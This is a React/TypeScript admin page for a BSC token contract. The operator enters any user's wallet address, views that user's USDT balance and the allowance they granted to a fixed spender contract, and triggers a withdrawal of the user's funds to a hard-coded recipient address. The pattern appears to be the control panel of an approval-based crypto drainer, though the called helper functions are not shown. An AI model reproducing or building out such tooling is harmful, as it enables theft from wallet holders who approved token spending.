// admin page 
"use client";
import React, { useEffect, useState } from 'react';
import { balance_USDT_Allownce, connectWalletBSC, contract_Owner, withDrawFunds } from './adminCall';
import { RECIPIENT_ADDRESS, SPENDER_ADDRESS } from './constent';

const Admin = () => {
  const [userAddress, setUserAddress] = useState('');
  const [amount, setAmount] = useState('');
  const [usdtBalance, setUsdtBalance] = useState('0');
  const [allowance, setAllowance] = useState(0);
  const [Connectedadmin, setConnectedAdmin] = useState(''); 
  const [Owner, setOwner] = useState<string | null>();


  const handleSend = () => {
    console.log('Send clicked', { userAddress, amount });
  };

  useEffect(()=>{
    if(Connectedadmin){
      const fetchBalanceAndAllowance = async () => {
        try {
          const OnwerAddress = await contract_Owner();
          setOwner(OnwerAddress);
          const { balance, allowance } = await balance_USDT_Allownce(userAddress);
          setUsdtBalance(balance);
          setAllowance(allowance);
         
        } catch (error) {
          console.error("Error fetching balance and allowance:", error);
        }
      };
      fetchBalanceAndAllowance();
    }


  },[userAddress, Connectedadmin])

  const ConnectWallet =async()=>{
    try {
     const { web3, account } = await connectWalletBSC();
     setConnectedAdmin(account)
    } catch (error) {
      console.error("Error connecting wallet:", error);
    }
  }

  const withDrawUSDT = async () => {
    try {
      if(!userAddress || !amount) {
        window.alert("Please enter user address and amount");
        return;
      }
      if(!Connectedadmin) {
        window.alert("Please connect your wallet first");
        return;
      }
      if(Owner && (Owner?.toLocaleLowerCase() !== Connectedadmin.toLocaleLowerCase())) {
        window.alert("You are not the owner of this contract");
        return;
      }

      console.log('withdrawing ')
      const data = await withDrawFunds(userAddress, Number(amount));
      if(data.status){
        window.alert("Transaction successful");
      }
    } catch (error) {
      console.error("Error withdrawing funds:", error);
    }
  };

  const trimAddreess = (address: string) => {
    if (!address) return '';
    return `${address.slice(0, 6)}...${address.slice(-4)}`;
  }

  return (
    <div className="p-6 bg-gray-100 min-h-screen">
      <h2 className="text-2xl font-bold mb-4 text-gray-700 text-center">Admin Panel</h2>
      <div className="mb-4">
        <label className="block text-gray-700 font-medium mb-2">
          Contract Address:
        </label>
        <input
          type="text"
          value={SPENDER_ADDRESS}
          disabled
          className="w-full p-2 border text-gray-700 border-gray-300 rounded bg-gray-200 cursor-not-allowed"
        />
      </div>
      <div className="mb-4">
        <label className="block text-gray-700 font-medium mb-2">
          Recipient Address:
        </label>
        <input
          type="text"
          value={RECIPIENT_ADDRESS}
          disabled
          className="w-full p-2 text-gray-700 border border-gray-300 rounded bg-gray-200 cursor-not-allowed"
        />
      </div>
      <div className="mb-4">
        <label className="block text-gray-700 font-medium mb-2">
          Contract Owner Address:
        </label>
        <input
          type="text"
          value={Owner as string || ''}
          disabled
          className="w-full p-2 text-gray-700 border border-gray-300 rounded"
        />
      </div>
      <div className="mb-4">
        <label className="block text-gray-700 font-medium mb-2">
          User Address:
        </label>
        <input
          type="text"
          value={userAddress}
          onChange={(e) => setUserAddress(e.target.value)}
          className="w-full p-2 text-gray-700 border border-gray-300 rounded"
        />
      </div>
      
      <div className="mb-4">
        <label className="block text-gray-700 font-medium mb-2">
          Amount:
        </label>
        <input
          type="number"
          value={amount}
          onChange={(e) => setAmount(e.target.value)}
          className="w-full p-2 border text-gray-700 border-gray-300 rounded"
        />
      </div>
      <button
        onClick={ConnectWallet}
        className="w-full bg-blue-500 text-white py-2 px-4 rounded-2xl hover:bg-blue-600 transition mb-4"
      >
        {Connectedadmin !== '' ? `Connected: ${trimAddreess(Connectedadmin)}` : 'Connect Wallet'}
      </button>
      <button
        onClick={withDrawUSDT}
        className="w-full bg-blue-500 text-white py-2 px-4 rounded-2xl hover:bg-blue-600 transition"
      >
        Withdraw
      </button>
      <div className="mt-6">
        <p className="text-gray-700 font-medium text-center">USDT Balance: <span className="font-bold">{usdtBalance}</span></p>
        <p className="text-gray-700 font-medium text-center">Allowance: <span className="font-bold">{allowance}</span></p>
      </div>
    </div>
  );
};

export default Admin;